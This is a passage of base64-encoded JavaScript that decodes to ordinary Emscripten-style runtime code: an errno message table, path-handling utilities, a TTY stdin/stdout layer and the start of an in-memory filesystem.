Qcm90b2NvbCBlcnJvciIsCiAgICA3MjogIk11bHRpaG9wIGF0dGVtcHRlZCIsCiAgICA3MzogIkNyb3NzIG1vdW50IHBvaW50IChub3QgcmVhbGx5IGVycm9yKSIsCiAgICA3NDogIlRyeWluZyB0byByZWFkIHVucmVhZGFibGUgbWVzc2FnZSIsCiAgICA3NTogIlZhbHVlIHRvbyBsYXJnZSBmb3IgZGVmaW5lZCBkYXRhIHR5cGUiLAogICAgNzY6ICJHaXZlbiBsb2cuIG5hbWUgbm90IHVuaXF1ZSIsCiAgICA3NzogImYuZC4gaW52YWxpZCBmb3IgdGhpcyBvcGVyYXRpb24iLAogICAgNzg6ICJSZW1vdGUgYWRkcmVzcyBjaGFuZ2VkIiwKICAgIDc5OiAiQ2FuIGFjY2VzcyBhIG5lZWRlZCBzaGFyZWQgbGliIiwKICAgIDgwOiAiQWNjZXNzaW5nIGEgY29ycnVwdGVkIHNoYXJlZCBsaWIiLAogICAgODE6ICIubGliIHNlY3Rpb24gaW4gYS5vdXQgY29ycnVwdGVkIiwKICAgIDgyOiAiQXR0ZW1wdGluZyB0byBsaW5rIGluIHRvbyBtYW55IGxpYnMiLAogICAgODM6ICJBdHRlbXB0aW5nIHRvIGV4ZWMgYSBzaGFyZWQgbGlicmFyeSIsCiAgICA4NDogIklsbGVnYWwgYnl0ZSBzZXF1ZW5jZSIsCiAgICA4NjogIlN0cmVhbXMgcGlwZSBlcnJvciIsCiAgICA4NzogIlRvbyBtYW55IHVzZXJzIiwKICAgIDg4OiAiU29ja2V0IG9wZXJhdGlvbiBvbiBub24tc29ja2V0IiwKICAgIDg5OiAiRGVzdGluYXRpb24gYWRkcmVzcyByZXF1aXJlZCIsCiAgICA5MDogIk1lc3NhZ2UgdG9vIGxvbmciLAogICAgOTE6ICJQcm90b2NvbCB3cm9uZyB0eXBlIGZvciBzb2NrZXQiLAogICAgOTI6ICJQcm90b2NvbCBub3QgYXZhaWxhYmxlIiwKICAgIDkzOiAiVW5rbm93biBwcm90b2NvbCIsCiAgICA5NDogIlNvY2tldCB0eXBlIG5vdCBzdXBwb3J0ZWQiLAogICAgOTU6ICJOb3Qgc3VwcG9ydGVkIiwKICAgIDk2OiAiUHJvdG9jb2wgZmFtaWx5IG5vdCBzdXBwb3J0ZWQiLAogICAgOTc6ICJBZGRyZXNzIGZhbWlseSBub3Qgc3VwcG9ydGVkIGJ5IHByb3RvY29sIGZhbWlseSIsCiAgICA5ODogIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiLAogICAgOTk6ICJBZGRyZXNzIG5vdCBhdmFpbGFibGUiLAogICAgMTAwOiAiTmV0d29yayBpbnRlcmZhY2UgaXMgbm90IGNvbmZpZ3VyZWQiLAogICAgMTAxOiAiTmV0d29yayBpcyB1bnJlYWNoYWJsZSIsCiAgICAxMDI6ICJDb25uZWN0aW9uIHJlc2V0IGJ5IG5ldHdvcmsiLAogICAgMTAzOiAiQ29ubmVjdGlvbiBhYm9ydGVkIiwKICAgIDEwNDogIkNvbm5lY3Rpb24gcmVzZXQgYnkgcGVlciIsCiAgICAxMDU6ICJObyBidWZmZXIgc3BhY2UgYXZhaWxhYmxlIiwKICAgIDEwNjogIlNvY2tldCBpcyBhbHJlYWR5IGNvbm5lY3RlZCIsCiAgICAxMDc6ICJTb2NrZXQgaXMgbm90IGNvbm5lY3RlZCIsCiAgICAxMDg6ICJDYW4ndCBzZW5kIGFmdGVyIHNvY2tldCBzaHV0ZG93biIsCiAgICAxMDk6ICJUb28gbWFueSByZWZlcmVuY2VzIiwKICAgIDExMDogIkNvbm5lY3Rpb24gdGltZWQgb3V0IiwKICAgIDExMTogIkNvbm5lY3Rpb24gcmVmdXNlZCIsCiAgICAxMTI6ICJIb3N0IGlzIGRvd24iLAogICAgMTEzOiAiSG9zdCBpcyB1bnJlYWNoYWJsZSIsCiAgICAxMTQ6ICJTb2NrZXQgYWxyZWFkeSBjb25uZWN0ZWQiLAogICAgMTE1OiAiQ29ubmVjdGlvbiBhbHJlYWR5IGluIHByb2dyZXNzIiwKICAgIDExNjogIlN0YWxlIGZpbGUgaGFuZGxlIiwKICAgIDEyMjogIlF1b3RhIGV4Y2VlZGVkIiwKICAgIDEyMzogIk5vIG1lZGl1bSAoaW4gdGFwZSBkcml2ZSkiLAogICAgMTI1OiAiT3BlcmF0aW9uIGNhbmNlbGVkIiwKICAgIDEzMDogIlByZXZpb3VzIG93bmVyIGRpZWQiLAogICAgMTMxOiAiU3RhdGUgbm90IHJlY292ZXJhYmxlIgp9OwoKZnVuY3Rpb24gX19fc2V0RXJyTm8odmFsdWUpIHsKICAgIGlmKE1vZHVsZVsiX19fZXJybm9fbG9jYXRpb24iXSkgSEVBUDMyW01vZHVsZVsiX19fZXJybm9fbG9jYXRpb24iXSgpID4+IDJdID0gdmFsdWU7CiAgICByZXR1cm4gdmFsdWUKfQoKdmFyIFBBVEggPSB7CiAgICBzcGxpdFBhdGg6IChmdW5jdGlvbihmaWxlbmFtZSkgewogICAgICAgIHZhciBzcGxpdFBhdGhSZSA9IC9eKFwvP3wpKFtcc1xTXSo/KSgoPzpcLnsxLDJ9fFteXC9dKz98KShcLlteLlwvXSp8KSkoPzpbXC9dKikkLzsKICAgICAgICByZXR1cm4gc3BsaXRQYXRoUmUuZXhlYyhmaWxlbmFtZSkuc2xpY2UoMSkKICAgIH0pLCBub3JtYWxpemVBcnJheTogKGZ1bmN0aW9uKHBhcnRzLCBhbGxvd0Fib3ZlUm9vdCkgewogICAgICAgIHZhciB1cCA9IDA7CiAgICAgICAgZm9yKHZhciBpID0gcGFydHMubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsKICAgICAgICAgICAgdmFyIGxhc3QgPSBwYXJ0c1tpXTsKICAgICAgICAgICAgaWYobGFzdCA9PT0gIi4iKSB7CiAgICAgICAgICAgICAgICBwYXJ0cy5zcGxpY2UoaSwgMSkKICAgICAgICAgICAgfSBlbHNlIGlmKGxhc3QgPT09ICIuLiIpIHsKICAgICAgICAgICAgICAgIHBhcnRzLnNwbGljZShpLCAxKTsKICAgICAgICAgICAgICAgIHVwKysKICAgICAgICAgICAgfSBlbHNlIGlmKHVwKSB7CiAgICAgICAgICAgICAgICBwYXJ0cy5zcGxpY2UoaSwgMSk7CiAgICAgICAgICAgICAgICB1cC0tCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYoYWxsb3dBYm92ZVJvb3QpIHsKICAgICAgICAgICAgZm9yKDsgdXA7IHVwLS0pIHsKICAgICAgICAgICAgICAgIHBhcnRzLnVuc2hpZnQoIi4uIikKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gcGFydHMKICAgIH0pLCBub3JtYWxpemU6IChmdW5jdGlvbihwYXRoKSB7CiAgICAgICAgdmFyIGlzQWJzb2x1dGUgPSBwYXRoLmNoYXJBdCgwKSA9PT0gIi8iLCB0cmFpbGluZ1NsYXNoID0gcGF0aC5zdWJzdHIoLTEpID09PSAiLyI7CiAgICAgICAgcGF0aCA9IFBBVEgubm9ybWFsaXplQXJyYXkocGF0aC5zcGxpdCgiLyIpLmZpbHRlcigoZnVuY3Rpb24ocCkgewogICAgICAgICAgICByZXR1cm4gISFwCiAgICAgICAgfSkpLCAhaXNBYnNvbHV0ZSkuam9pbigiLyIpOwogICAgICAgIGlmKCFwYXRoICYmICFpc0Fic29sdXRlKSB7CiAgICAgICAgICAgIHBhdGggPSAiLiIKICAgICAgICB9CiAgICAgICAgaWYocGF0aCAmJiB0cmFpbGluZ1NsYXNoKSB7CiAgICAgICAgICAgIHBhdGggKz0gIi8iCiAgICAgICAgfQogICAgICAgIHJldHVybiAoaXNBYnNvbHV0ZSA/ICIvIiA6ICIiKSArIHBhdGgKICAgIH0pLCBkaXJuYW1lOiAoZnVuY3Rpb24ocGF0aCkgewogICAgICAgIHZhciByZXN1bHQgPSBQQVRILnNwbGl0UGF0aChwYXRoKSwgcm9vdCA9IHJlc3VsdFswXSwgZGlyID0gcmVzdWx0WzFdOwogICAgICAgIGlmKCFyb290ICYmICFkaXIpIHsKICAgICAgICAgICAgcmV0dXJuICIuIgogICAgICAgIH0KICAgICAgICBpZihkaXIpIHsKICAgICAgICAgICAgZGlyID0gZGlyLnN1YnN0cigwLCBkaXIubGVuZ3RoIC0gMSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJvb3QgKyBkaXIKICAgIH0pLCBiYXNlbmFtZTogKGZ1bmN0aW9uKHBhdGgpIHsKICAgICAgICBpZihwYXRoID09PSAiLyIpIHJldHVybiAiLyI7CiAgICAgICAgdmFyIGxhc3RTbGFzaCA9IHBhdGgubGFzdEluZGV4T2YoIi8iKTsKICAgICAgICBpZihsYXN0U2xhc2ggPT09IC0xKSByZXR1cm4gcGF0aDsKICAgICAgICByZXR1cm4gcGF0aC5zdWJzdHIobGFzdFNsYXNoICsgMSkKICAgIH0pLCBleHRuYW1lOiAoZnVuY3Rpb24ocGF0aCkgewogICAgICAgIHJldHVybiBQQVRILnNwbGl0UGF0aChwYXRoKVszXQogICAgfSksIGpvaW46IChmdW5jdGlvbigpIHsKICAgICAgICB2YXIgcGF0aHMgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMsIDApOwogICAgICAgIHJldHVybiBQQVRILm5vcm1hbGl6ZShwYXRocy5qb2luKCIvIikpCiAgICB9KSwgam9pbjI6IChmdW5jdGlvbihsLCByKSB7CiAgICAgICAgcmV0dXJuIFBBVEgubm9ybWFsaXplKGwgKyAiLyIgKyByKQogICAgfSksIHJlc29sdmU6IChmdW5jdGlvbigpIHsKICAgICAgICB2YXIgcmVzb2x2ZWRQYXRoID0gIiIsIHJlc29sdmVkQWJzb2x1dGUgPSBmYWxzZTsKICAgICAgICBmb3IodmFyIGkgPSBhcmd1bWVudHMubGVuZ3RoIC0gMTsgaSA+PSAtMSAmJiAhcmVzb2x2ZWRBYnNvbHV0ZTsgaS0tKSB7CiAgICAgICAgICAgIHZhciBwYXRoID0gaSA+PSAwID8gYXJndW1lbnRzW2ldIDogRlMuY3dkKCk7CiAgICAgICAgICAgIGlmKHR5cGVvZiBwYXRoICE9PSAic3RyaW5nIikgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IFR5cGVFcnJvcigiQXJndW1lbnRzIHRvIHBhdGgucmVzb2x2ZSBtdXN0IGJlIHN0cmluZ3MiKQogICAgICAgICAgICB9IGVsc2UgaWYoIXBhdGgpIHsKICAgICAgICAgICAgICAgIHJldHVybiAiIgogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlc29sdmVkUGF0aCA9IHBhdGggKyAiLyIgKyByZXNvbHZlZFBhdGg7CiAgICAgICAgICAgIHJlc29sdmVkQWJzb2x1dGUgPSBwYXRoLmNoYXJBdCgwKSA9PT0gIi8iCiAgICAgICAgfQogICAgICAgIHJlc29sdmVkUGF0aCA9IFBBVEgubm9ybWFsaXplQXJyYXkocmVzb2x2ZWRQYXRoLnNwbGl0KCIvIikuZmlsdGVyKChmdW5jdGlvbihwKSB7CiAgICAgICAgICAgIHJldHVybiAhIXAKICAgICAgICB9KSksICFyZXNvbHZlZEFic29sdXRlKS5qb2luKCIvIik7CiAgICAgICAgcmV0dXJuIChyZXNvbHZlZEFic29sdXRlID8gIi8iIDogIiIpICsgcmVzb2x2ZWRQYXRoIHx8ICIuIgogICAgfSksIHJlbGF0aXZlOiAoZnVuY3Rpb24oZnJvbSwgdG8pIHsKICAgICAgICBmcm9tID0gUEFUSC5yZXNvbHZlKGZyb20pLnN1YnN0cigxKTsKICAgICAgICB0byA9IFBBVEgucmVzb2x2ZSh0bykuc3Vic3RyKDEpOwoKICAgICAgICBmdW5jdGlvbiB0cmltKGFycikgewogICAgICAgICAgICB2YXIgc3RhcnQgPSAwOwogICAgICAgICAgICBmb3IoOyBzdGFydCA8IGFyci5sZW5ndGg7IHN0YXJ0KyspIHsKICAgICAgICAgICAgICAgIGlmKGFycltzdGFydF0gIT09ICIiKSBicmVhawogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBlbmQgPSBhcnIubGVuZ3RoIC0gMTsKICAgICAgICAgICAgZm9yKDsgZW5kID49IDA7IGVuZC0tKSB7CiAgICAgICAgICAgICAgICBpZihhcnJbZW5kXSAhPT0gIiIpIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoc3RhcnQgPiBlbmQpIHJldHVybiBbXTsKICAgICAgICAgICAgcmV0dXJuIGFyci5zbGljZShzdGFydCwgZW5kIC0gc3RhcnQgKyAxKQogICAgICAgIH0KCiAgICAgICAgdmFyIGZyb21QYXJ0cyA9IHRyaW0oZnJvbS5zcGxpdCgiLyIpKTsKICAgICAgICB2YXIgdG9QYXJ0cyA9IHRyaW0odG8uc3BsaXQoIi8iKSk7CiAgICAgICAgdmFyIGxlbmd0aCA9IE1hdGgubWluKGZyb21QYXJ0cy5sZW5ndGgsIHRvUGFydHMubGVuZ3RoKTsKICAgICAgICB2YXIgc2FtZVBhcnRzTGVuZ3RoID0gbGVuZ3RoOwogICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykgewogICAgICAgICAgICBpZihmcm9tUGFydHNbaV0gIT09IHRvUGFydHNbaV0pIHsKICAgICAgICAgICAgICAgIHNhbWVQYXJ0c0xlbmd0aCA9IGk7CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHZhciBvdXRwdXRQYXJ0cyA9IFtdOwogICAgICAgIGZvcih2YXIgaSA9IHNhbWVQYXJ0c0xlbmd0aDsgaSA8IGZyb21QYXJ0cy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICBvdXRwdXRQYXJ0cy5wdXNoKCIuLiIpCiAgICAgICAgfQogICAgICAgIG91dHB1dFBhcnRzID0gb3V0cHV0UGFydHMuY29uY2F0KHRvUGFydHMuc2xpY2Uoc2FtZVBhcnRzTGVuZ3RoKSk7CiAgICAgICAgcmV0dXJuIG91dHB1dFBhcnRzLmpvaW4oIi8iKQogICAgfSkKfTsKdmFyIFRUWSA9IHsKICAgIHR0eXM6IFtdLCBpbml0OiAoZnVuY3Rpb24oKSB7CiAgICB9KSwgc2h1dGRvd246IChmdW5jdGlvbigpIHsKICAgIH0pLCByZWdpc3RlcjogKGZ1bmN0aW9uKGRldiwgb3BzKSB7CiAgICAgICAgVFRZLnR0eXNbZGV2XSA9IHtpbnB1dDogW10sIG91dHB1dDogW10sIG9wczogb3BzfTsKICAgICAgICBGUy5yZWdpc3RlckRldmljZShkZXYsIFRUWS5zdHJlYW1fb3BzKQogICAgfSksIHN0cmVhbV9vcHM6IHsKICAgICAgICBvcGVuOiAoZnVuY3Rpb24oc3RyZWFtKSB7CiAgICAgICAgICAgIHZhciB0dHkgPSBUVFkudHR5c1tzdHJlYW0ubm9kZS5yZGV2XTsKICAgICAgICAgICAgaWYoIXR0eSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHN0cmVhbS50dHkgPSB0dHk7CiAgICAgICAgICAgIHN0cmVhbS5zZWVrYWJsZSA9IGZhbHNlCiAgICAgICAgfSksIGNsb3NlOiAoZnVuY3Rpb24oc3RyZWFtKSB7CiAgICAgICAgICAgIHN0cmVhbS50dHkub3BzLmZsdXNoKHN0cmVhbS50dHkpCiAgICAgICAgfSksIGZsdXNoOiAoZnVuY3Rpb24oc3RyZWFtKSB7CiAgICAgICAgICAgIHN0cmVhbS50dHkub3BzLmZsdXNoKHN0cmVhbS50dHkpCiAgICAgICAgfSksIHJlYWQ6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvcykgewogICAgICAgICAgICBpZighc3RyZWFtLnR0eSB8fCAhc3RyZWFtLnR0eS5vcHMuZ2V0X2NoYXIpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOWElPKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBieXRlc1JlYWQgPSAwOwogICAgICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgIHZhciByZXN1bHQ7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IHN0cmVhbS50dHkub3BzLmdldF9jaGFyKHN0cmVhbS50dHkpCiAgICAgICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZihyZXN1bHQgPT09IHVuZGVmaW5lZCAmJiBieXRlc1JlYWQgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQUdBSU4pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZihyZXN1bHQgPT09IG51bGwgfHwgcmVzdWx0ID09PSB1bmRlZmluZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgYnl0ZXNSZWFkKys7CiAgICAgICAgICAgICAgICBidWZmZXJbb2Zmc2V0ICsgaV0gPSByZXN1bHQKICAgICAgICAgICAgfQogICAgICAgICAgICBpZihieXRlc1JlYWQpIHsKICAgICAgICAgICAgICAgIHN0cmVhbS5ub2RlLnRpbWVzdGFtcCA9IERhdGUubm93KCkKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gYnl0ZXNSZWFkCiAgICAgICAgfSksIHdyaXRlOiAoZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3MpIHsKICAgICAgICAgICAgaWYoIXN0cmVhbS50dHkgfHwgIXN0cmVhbS50dHkub3BzLnB1dF9jaGFyKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTlhJTykKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgc3RyZWFtLnR0eS5vcHMucHV0X2NoYXIoc3RyZWFtLnR0eSwgYnVmZmVyW29mZnNldCArIGldKQogICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKGxlbmd0aCkgewogICAgICAgICAgICAgICAgc3RyZWFtLm5vZGUudGltZXN0YW1wID0gRGF0ZS5ub3coKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBpCiAgICAgICAgfSkKICAgIH0sIGRlZmF1bHRfdHR5X29wczogewogICAgICAgIGdldF9jaGFyOiAoZnVuY3Rpb24odHR5KSB7CiAgICAgICAgICAgIGlmKCF0dHkuaW5wdXQubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gbnVsbDsKICAgICAgICAgICAgICAgIGlmKEVOVklST05NRU5UX0lTX05PREUpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgQlVGU0laRSA9IDI1NjsKICAgICAgICAgICAgICAgICAgICB2YXIgYnVmID0gbmV3IEJ1ZmZlcihCVUZTSVpFKTsKICAgICAgICAgICAgICAgICAgICB2YXIgYnl0ZXNSZWFkID0gMDsKICAgICAgICAgICAgICAgICAgICB2YXIgaXNQb3NpeFBsYXRmb3JtID0gcHJvY2Vzcy5wbGF0Zm9ybSAhPSAid2luMzIiOwogICAgICAgICAgICAgICAgICAgIHZhciBmZCA9IHByb2Nlc3Muc3RkaW4uZmQ7CiAgICAgICAgICAgICAgICAgICAgaWYoaXNQb3NpeFBsYXRmb3JtKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB1c2luZ0RldmljZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmQgPSBmcy5vcGVuU3luYygiL2Rldi9zdGRpbiIsICJyIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2luZ0RldmljZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXNSZWFkID0gZnMucmVhZFN5bmMoZmQsIGJ1ZiwgMCwgQlVGU0laRSwgbnVsbCkKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoZS50b1N0cmluZygpLmluZGV4T2YoIkVPRiIpICE9IC0xKSBieXRlc1JlYWQgPSAwOyBlbHNlIHRocm93IGUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYodXNpbmdEZXZpY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZnMuY2xvc2VTeW5jKGZkKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZihieXRlc1JlYWQgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IGJ1Zi5zbGljZSgwLCBieXRlc1JlYWQpLnRvU3RyaW5nKCJ1dGYtOCIpCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZih0eXBlb2Ygd2luZG93ICE9ICJ1bmRlZmluZWQiICYmIHR5cGVvZiB3aW5kb3cucHJvbXB0ID09ICJmdW5jdGlvbiIpIHsKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSB3aW5kb3cucHJvbXB0KCJJbnB1dDogIik7CiAgICAgICAgICAgICAgICAgICAgaWYocmVzdWx0ICE9PSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdCArPSAiXG4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIGlmKHR5cGVvZiByZWFkbGluZSA9PSAiZnVuY3Rpb24iKSB7CiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gcmVhZGxpbmUoKTsKICAgICAgICAgICAgICAgICAgICBpZihyZXN1bHQgIT09IG51bGwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0ICs9ICJcbiIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZighcmVzdWx0KSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHR0eS5pbnB1dCA9IGludEFycmF5RnJvbVN0cmluZyhyZXN1bHQsIHRydWUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHR0eS5pbnB1dC5zaGlmdCgpCiAgICAgICAgfSksIHB1dF9jaGFyOiAoZnVuY3Rpb24odHR5LCB2YWwpIHsKICAgICAgICAgICAgaWYodmFsID09PSBudWxsIHx8IHZhbCA9PT0gMTApIHsKICAgICAgICAgICAgICAgIE1vZHVsZVsicHJpbnQiXShVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LCAwKSk7CiAgICAgICAgICAgICAgICB0dHkub3V0cHV0ID0gW10KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmKHZhbCAhPSAwKSB0dHkub3V0cHV0LnB1c2godmFsKQogICAgICAgICAgICB9CiAgICAgICAgfSksIGZsdXNoOiAoZnVuY3Rpb24odHR5KSB7CiAgICAgICAgICAgIGlmKHR0eS5vdXRwdXQgJiYgdHR5Lm91dHB1dC5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBNb2R1bGVbInByaW50Il0oVVRGOEFycmF5VG9TdHJpbmcodHR5Lm91dHB1dCwgMCkpOwogICAgICAgICAgICAgICAgdHR5Lm91dHB1dCA9IFtdCiAgICAgICAgICAgIH0KICAgICAgICB9KQogICAgfSwgZGVmYXVsdF90dHkxX29wczogewogICAgICAgIHB1dF9jaGFyOiAoZnVuY3Rpb24odHR5LCB2YWwpIHsKICAgICAgICAgICAgaWYodmFsID09PSBudWxsIHx8IHZhbCA9PT0gMTApIHsKICAgICAgICAgICAgICAgIE1vZHVsZVsicHJpbnRFcnIiXShVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LCAwKSk7CiAgICAgICAgICAgICAgICB0dHkub3V0cHV0ID0gW10KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmKHZhbCAhPSAwKSB0dHkub3V0cHV0LnB1c2godmFsKQogICAgICAgICAgICB9CiAgICAgICAgfSksIGZsdXNoOiAoZnVuY3Rpb24odHR5KSB7CiAgICAgICAgICAgIGlmKHR0eS5vdXRwdXQgJiYgdHR5Lm91dHB1dC5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBNb2R1bGVbInByaW50RXJyIl0oVVRGOEFycmF5VG9TdHJpbmcodHR5Lm91dHB1dCwgMCkpOwogICAgICAgICAgICAgICAgdHR5Lm91dHB1dCA9IFtdCiAgICAgICAgICAgIH0KICAgICAgICB9KQogICAgfQp9Owp2YXIgTUVNRlMgPSB7CiAgICBvcHNfdGFibGU6IG51bGwsIG1vdW50OiAoZnVuY3Rpb24obW91bnQpIHsKICAgICAgICByZXR1cm4gTUVNRlMuY3JlYXRlTm9kZShudWxsLCAiLyIsIDE2Mzg0IHwgNTExLCAwKQogICAgfSksIGNyZWF0ZU5vZGU6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUsIG1vZGUsIGRldikgewogICAgICAgIGlmKEZTLmlzQmxrZGV2KG1vZGUpIHx8IEZTLmlzRklGTyhtb2RlKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9CiAgICAgICAgaWYoIU1FTUZTLm9wc190YWJsZSkgewogICAgICAgICAgICBNRU1GUy5vcHNfdGFibGUgPSB7CiAgICAgICAgICAgICAgICBkaXI6IHsKICAgICAgICAgICAgICAgICAgICBub2RlOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGdldGF0dHI6IE1FTUZTLm5vZGVfb3BzLmdldGF0dHIsCiAgICAgICAgICAgICAgICAgICAgICAgIHNldGF0dHI6IE1FTUZTLm5vZGVfb3BzLnNldGF0dHIsCiAgICAgICAgICAgICAgICAgICAgICAgIGxvb2t1cDogTUVNRlMubm9kZV9vcHMubG9va3VwLAogICAgICAgICAgICAgICAgICAgICAgICBta25vZDogTUVNRlMubm9kZV9vcHMubWtub2QsCiAgICAgICAgICAgICAgICAgICAgICAgIHJlbmFtZTogTUVNRlMubm9kZV9vcHMucmVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICB1bmxpbms6IE1FTUZTLm5vZGVfb3BzLnVubGluaywKICAgICAgICAgICAgICAgICAgICAgICAgcm1kaXI6IE1FTUZTLm5vZGVfb3BzLnJtZGlyLAogICAgICAgICAgICAgICAgICAgICAgICByZWFkZGlyOiBNRU1GUy5ub2RlX29wcy5yZWFkZGlyLAogICAgICAgICAgICAgICAgICAgICAgICBzeW1saW5rOiBNRU1GUy5ub2RlX29wcy5zeW1saW5rCiAgICAgICAgICAgICAgICAgICAgfSwgc3RyZWFtOiB7bGxzZWVrOiBNRU1GUy5zdHJlYW1fb3BzLmxsc2Vla30KICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBmaWxlOiB7CiAgICAgICAgICAgICAgICAgICAgbm9kZToge2dldGF0dHI6IE1FTUZTLm5vZGVfb3BzLmdldGF0dHIsIHNldGF0dHI6IE1FTUZTLm5vZGVfb3BzLnNldGF0dHJ9LAogICAgICAgICAgICAgICAgICAgIHN0cmVhbTogewogICAgICAgICAgICAgICAgICAgICAgICBsbHNlZWs6IE1FTUZTLnN0cmVhbV9vcHMubGxzZWVrLAogICAgICAgICAgICAgICAgICAgICAgICByZWFkOiBNRU1GUy5zdHJlYW1fb3BzLnJlYWQsCiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlOiBNRU1GUy5zdHJlYW1fb3BzLndyaXRlLAogICAgICAgICAgICAgICAgICAgICAgICBhbGxvY2F0ZTogTUVNRlMuc3RyZWFtX29wcy5hbGxvY2F0ZSwKICAgICAgICAgICAgICAgICAgICAgICAgbW1hcDogTUVNRlMuc3RyZWFtX29wcy5tbWFwLAogICAgICAgICAgICAgICAgICAgICAgICBtc3luYzogTUVNRlMuc3RyZWFtX29wcy5tc3luYwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBsaW5rOiB7CiAgICAgICAgICAgICAgICAgICAgbm9kZTogewogICAgICAgICAgICAgICAgICAgICAgICBnZXRhdHRyOiBNRU1GUy5ub2RlX29wcy5nZXRhdHRy